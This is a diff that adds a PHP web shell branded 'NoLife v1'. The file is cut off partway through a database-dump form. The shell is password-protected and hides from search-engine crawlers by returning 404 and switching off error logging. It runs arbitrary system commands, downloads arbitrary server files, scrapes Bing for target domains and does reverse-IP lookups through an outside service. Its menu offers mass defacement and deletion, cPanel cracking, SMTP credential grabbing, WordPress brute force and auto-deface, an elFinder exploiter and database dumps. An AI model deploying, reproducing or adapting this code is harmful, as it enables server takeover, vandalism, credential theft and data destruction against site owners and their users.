@@ -1,0 +1,459 @@
+<?php
+session_start();
+error_reporting(0);
+set_time_limit(0);
+@set_magic_quotes_runtime(0);
+@clearstatcache();
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('output_buffering',0);
+@ini_set('display_errors', 0);
+
+$auth_pass = "7ba3b944b1e52d58e6cc6a6463db087d"; // default: depok123
+$color = "#00ff00";
+$default_action = 'FilesMan';
+$default_use_ajax = true;
+$default_charset = 'UTF-8';
+if(!empty($_SERVER['HTTP_USER_AGENT'])) {
+    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
+    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
+    }
+}
+
+function login_shell() {
+?>
+<html>
+<head>
+<title>NoLifeTeam</title>
+<style type="text/css">
+html {
+	margin: 20px auto;
+	background: #000000;
+	color: green;
+	text-align: center;
+}
+header {
+	color: red;
+	margin: 10px auto;
+}
+input[type=password] {
+	color: grey;
+	background: #000000;
+	border: 1px dotted white;
+	margin-left: 20px;
+	text-align: center;
+}
+input[type=text] {
+	color: grey;
+	background: #000000;
+	border: 1px dotted white;
+	margin-left: 20px;
+	text-align: center;
+}
+</style>
+</head>
+<center>
+<header>
+<font color="blue" size="7">NoLife</font><font color="white" size="3">v1</font>
+<br />
+<? 
+echo "Defacer IP: <font color=white>".$_SERVER['REMOTE_ADDR']."</font><br>";
+ 
+?>
+</header>
+<table border=1>
+<tr>
+<td><center><font color="white">Username :</font></center></td>
+<td><center><input type="text" name="user" value="L4N4N9_4K1R4">
+</form></center></td>
+</tr>
+<tr>
+<td><center><font color="white">Password :</font></center></td>
+<td><center><form method="post">
+<input type="password" name="pass">
+</form>
+</center></td>
+</tr>
+</table> 
+<br />
+<?php
+exit;
+}
+if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
+    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+    else
+        login_shell();
+if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
+    @ob_clean();
+    $file = $_GET['file'];
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="'.basename($file).'"');
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate');
+    header('Pragma: public');
+    header('Content-Length: ' . filesize($file));
+    readfile($file);
+    exit;
+    echo "Insert Your Username & Password!";
+}
+?>
+<html>
+<head>
+<title>NoLife</title>
+<meta name='author' content='L4N4N9_4K1R4'>
+<meta charset="UTF-8">
+<style type='text/css'> 
+@import url(https://fonts.googleapis.com/css?family=Ubuntu);
+html {
+    background: #000000;
+    color: white;
+    font-family: 'Ubuntu';
+	font-size: 13px;
+	width: 100%;
+	text-align: center;
+}
+li {
+	display: inline;
+	margin: 5px;
+	padding: 5px;
+}
+table, th, td {
+	border-collapse:collapse;
+	font-family: Tahoma, Geneva, sans-serif;
+	background: transparent;
+	font-family: 'Ubuntu';
+	font-size: 13px;
+}
+.table_home, .th_home, .td_home {
+	border: 1px solid blue;
+}
+th {
+	padding: 10px;
+}
+a {
+	color: #ffffff;
+	text-decoration: none;
+}
+a:hover {
+	color: red;
+	text-decoration: underline;
+}
+b {
+	color: gold;
+}
+input[type=text], input[type=password],input[type=submit] {
+	background: transparent; 
+	color: yellow; 
+	border: 1px solid blue; 
+	margin: 5px auto;
+	padding-left: 5px;
+	font-family: 'Ubuntu';
+	font-size: 13px;
+}
+textarea {
+	border: 1px solid blue;
+	width: 100%;
+	height: 400px;
+	padding-left: 5px;
+	margin: 10px auto;
+	resize: none;
+	background: transparent;
+	color: yellow;
+	font-family: 'Ubuntu';
+	font-size: 13px;
+}
+select {
+	width: 152px;
+	background: #000000; 
+	color: lime; 
+	border: 1px solid #ffffff; 
+	margin: 5px auto;
+	padding-left: 5px;
+	font-family: 'Ubuntu';
+	font-size: 13px;
+}
+option:hover {
+	background: blue;
+	color: #000000;
+}
+</style>
+-=<font color="blue" size="4">NoLife</font>=-
+<br />
+<font color="red" size="5">L4N4N9_4K1R4</font>
+<br />
+</head>
+<?php
+###############################################################################
+// Greetz To IndoXploit - 1ntr0ver7_Tersakiti - NoLife
+// L4N4N9_4K1R4
+###############################################################################
+function w($dir,$perm) {
+	if(!is_writable($dir)) {
+		return "<font color=red>".$perm."</font>";
+	} else {
+		return "<font color=lime>".$perm."</font>";
+	}
+}
+function r($dir,$perm) {
+	if(!is_readable($dir)) {
+		return "<font color=red>".$perm."</font>";
+	} else {
+		return "<font color=lime>".$perm."</font>";
+	}
+}
+function exe($cmd) {
+	if(function_exists('system')) { 		
+		@ob_start(); 		
+		@system($cmd); 		
+		$buff = @ob_get_contents(); 		
+		@ob_end_clean(); 		
+		return $buff; 	
+	} elseif(function_exists('exec')) { 		
+		@exec($cmd,$results); 		
+		$buff = ""; 		
+		foreach($results as $result) { 			
+			$buff .= $result; 		
+		} return $buff; 	
+	} elseif(function_exists('passthru')) { 		
+		@ob_start(); 		
+		@passthru($cmd); 		
+		$buff = @ob_get_contents(); 		
+		@ob_end_clean(); 		
+		return $buff; 	
+	} elseif(function_exists('shell_exec')) { 		
+		$buff = @shell_exec($cmd); 		
+		return $buff; 	
+	} 
+}
+function perms($file){
+	$perms = fileperms($file);
+	if (($perms & 0xC000) == 0xC000) {
+	// Socket
+	$info = 's';
+	} elseif (($perms & 0xA000) == 0xA000) {
+	// Symbolic Link
+	$info = 'l';
+	} elseif (($perms & 0x8000) == 0x8000) {
+	// Regular
+	$info = '-';
+	} elseif (($perms & 0x6000) == 0x6000) {
+	// Block special
+	$info = 'b';
+	} elseif (($perms & 0x4000) == 0x4000) {
+	// Directory
+	$info = 'd';
+	} elseif (($perms & 0x2000) == 0x2000) {
+	// Character special
+	$info = 'c';
+	} elseif (($perms & 0x1000) == 0x1000) {
+	// FIFO pipe
+	$info = 'p';
+	} else {
+	// Unknown
+	$info = 'u';
+	}
+		// Owner
+	$info .= (($perms & 0x0100) ? 'r' : '-');
+	$info .= (($perms & 0x0080) ? 'w' : '-');
+	$info .= (($perms & 0x0040) ?
+	(($perms & 0x0800) ? 's' : 'x' ) :
+	(($perms & 0x0800) ? 'S' : '-'));
+	// Group
+	$info .= (($perms & 0x0020) ? 'r' : '-');
+	$info .= (($perms & 0x0010) ? 'w' : '-');
+	$info .= (($perms & 0x0008) ?
+	(($perms & 0x0400) ? 's' : 'x' ) :
+	(($perms & 0x0400) ? 'S' : '-'));
+	// World
+	$info .= (($perms & 0x0004) ? 'r' : '-');
+	$info .= (($perms & 0x0002) ? 'w' : '-');
+	$info .= (($perms & 0x0001) ?
+	(($perms & 0x0200) ? 't' : 'x' ) :
+	(($perms & 0x0200) ? 'T' : '-'));
+	return $info;
+}
+function hdd($s) {
+	if($s >= 1073741824)
+	return sprintf('%1.2f',$s / 1073741824 ).' GB';
+	elseif($s >= 1048576)
+	return sprintf('%1.2f',$s / 1048576 ) .' MB';
+	elseif($s >= 1024)
+	return sprintf('%1.2f',$s / 1024 ) .' KB';
+	else
+	return $s .' B';
+}
+function ambilKata($param, $kata1, $kata2){
+    if(strpos($param, $kata1) === FALSE) return FALSE;
+    if(strpos($param, $kata2) === FALSE) return FALSE;
+    $start = strpos($param, $kata1) + strlen($kata1);
+    $end = strpos($param, $kata2, $start);
+    $return = substr($param, $start, $end - $start);
+    return $return;
+}
+function getsource($url) {
+    $curl = curl_init($url);
+    		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+    		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+    		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+    		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+    $content = curl_exec($curl);
+    		curl_close($curl);
+    return $content;
+}
+function bing($dork) {
+	$npage = 1;
+	$npages = 30000;
+	$allLinks = array();
+	$lll = array();
+	while($npage <= $npages) {
+	    $x = getsource("http://www.bing.com/search?q=".$dork."&first=".$npage);
+	    if($x) {
+			preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
+			foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
+			$npage = $npage + 10;
+			if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
+		} else break;
+	}
+	$URLs = array();
+	foreach($allLinks as $url){
+	    $exp = explode("/", $url);
+	    $URLs[] = $exp[2];
+	}
+	$array = array_filter($URLs);
+	$array = array_unique($array);
+ 	$sss = count(array_unique($array));
+	foreach($array as $domain) {
+		echo $domain."\n";
+	}
+}
+function reverse($url) {
+	$ch = curl_init("http://domains.yougetsignal.com/domains.php");
+		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
+		  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
+		  curl_setopt($ch, CURLOPT_HEADER, 0);
+		  curl_setopt($ch, CURLOPT_POST, 1);
+	$resp = curl_exec($ch);
+	$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
+	$array = explode(",,", $resp);
+	unset($array[0]);
+	foreach($array as $lnk) {
+		$lnk = "http://$lnk";
+		$lnk = str_replace(",", "", $lnk);
+		echo $lnk."\n";
+		ob_flush();
+		flush();
+	}
+		curl_close($ch);
+}
+if(get_magic_quotes_gpc()) {
+	function idx_ss($array) {
+		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
+	}
+	$_POST = idx_ss($_POST);
+	$_COOKIE = idx_ss($_COOKIE);
+}
+
+if(isset($_GET['dir'])) {
+	$dir = $_GET['dir'];
+	chdir($dir);
+} else {
+	$dir = getcwd();
+}
+$kernel = php_uname();
+$ip = gethostbyname($_SERVER['HTTP_HOST']);
+$dir = str_replace("\\","/",$dir);
+$scdir = explode("/", $dir);
+$freespace = hdd(disk_free_space("/"));
+$total = hdd(disk_total_space("/"));
+$used = $total - $freespace;
+$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
+$ds = @ini_get("disable_functions");
+$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
+$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
+$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
+$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
+$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
+$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
+if(!function_exists('posix_getegid')) {
+	$user = @get_current_user();
+	$uid = @getmyuid();
+	$gid = @getmygid();
+	$group = "?";
+} else {
+	$uid = @posix_getpwuid(posix_geteuid());
+	$gid = @posix_getgrgid(posix_getegid());
+	$user = $uid['name'];
+	$uid = $uid['uid'];
+	$group = $gid['name'];
+	$gid = $gid['gid'];
+}
+echo "System: <font color=lime>".$kernel."</font><br>";
+echo "User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")<br>";
+echo "Server IP: <font color=lime>".$ip."</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font><br>";
+echo "HDD: <font color=lime>$used</font> / <font color=lime>$total</font> ( Free: <font color=lime>$freespace</font> )<br>";
+echo "Safe Mode: $sm<br>";
+echo "Disable Functions: $show_ds<br>";
+echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
+echo "Current DIR: ";
+foreach($scdir as $c_dir => $cdir) {	
+	echo "<a href='?dir=";
+	for($i = 0; $i <= $c_dir; $i++) {
+		echo $scdir[$i];
+		if($i != $c_dir) {
+		echo "/";
+		}
+	}
+	echo "'>$cdir</a>/";
+}
+echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]";
+echo "<hr>";
+echo "<center>";
+echo "<ul>";
+echo "<li>[ <a href='?'>Home</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=upload'>Upload</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=cmd'>Command</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=mass_deface'>Mass Deface</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=mass_delete'>Mass Delete</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=config'>Config</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=jumping'>Jumping</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=bypass'>Bypass</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=cpanel'>CPanel Crack</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=smtp'>SMTP Grabber</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=zoneh'>Zone-H</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=cgi'>CGI Telnet</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=network'>network</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=adminer'>Adminer</a> ]</li><br>";
+echo "<li>[ <a href='?dir=$dir&do=fake_root'>Fake Root</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=auto_wp'>Auto Edit Title WordPress</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=auto_dwp'>WordPress Auto Deface</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=auto_dwp2'>WordPress Auto Deface V.2</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=wp-bf'>WordPress Brute Force</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=cpftp_auto'>CPanel/FTP Auto Deface</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=elfinder'>ElFinder Auto Exploiter</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=hash'>Hash</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=dump'>Database Dump</a> ]</li>";
+echo "<li>[ <a style='color: yellow;' href='?do=about'>About</a> ]</li>";
+echo "<li>[ <a style='color: red;' href='?logout=true'>Logout</a> ]</li>";
+echo "</ul>";
+echo "</center>";
+echo "<hr>";
+if($_GET['logout'] == true) {
+	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
+	echo "<script>window.location='?';</script>";
+
+ } if($_GET['do'] == 'dump') {
+	 echo "<form method='post'>";
+   echo $head."<p align='center'>";
+   echo "<table width='371' class=tabnet>";
+   echo "<tr><th colspan='2'>Database Dump</th></tr>";
+   echo "<tr>";
+	 echo "<td>Server </td>";
+	 echo "<td><input class='inputz' type=text name=server size=52></td></tr><tr>";
+	 echo "<td
